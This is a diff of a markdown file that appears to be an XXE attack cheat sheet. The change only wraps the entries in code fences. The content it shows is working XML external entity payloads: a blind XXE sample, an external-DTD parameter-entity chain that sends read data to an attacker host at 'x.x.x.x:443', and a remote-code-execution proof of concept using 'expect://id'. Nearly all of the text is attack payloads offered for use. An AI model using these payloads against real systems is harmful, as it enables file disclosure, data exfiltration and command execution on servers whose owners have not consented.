@@ -1,5 +1,5 @@
 ## Blind xxe ##
-
+```
 <!--?xml version="1.0" encoding="ISO-8859-1" ?>
 <!DOCTYPE replace [<!ENTITY example "Doe"> ]>
  <userInfo>
@@ -27,9 +27,9 @@
 <password>dsfsakfskfls</password>
 </root>
 ---------------------------------------------------------------------------------
-
+```
 ## External DTD ##
-
+```
 <?xml version="1.0" ?>
 <!DOCTYPE r [
 <!ELEMENT r ANY >
@@ -48,10 +48,10 @@
 <!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://x.x.x.x:443/?%data;'>">
 
 ---------------------------------------------------------------------------------------
-
+```
 
 ## POC with RCE ## 
-
+```
 <?xml version="1.0" encoding="ISO-8859-1"?>
 <!DOCTYPE foo [ <!ELEMENT foo ANY >
 <!ENTITY xxe SYSTEM "expect://id" >]>
@@ -60,3 +60,4 @@
     <pass>mypass</pass>
 </creds>
 
+```
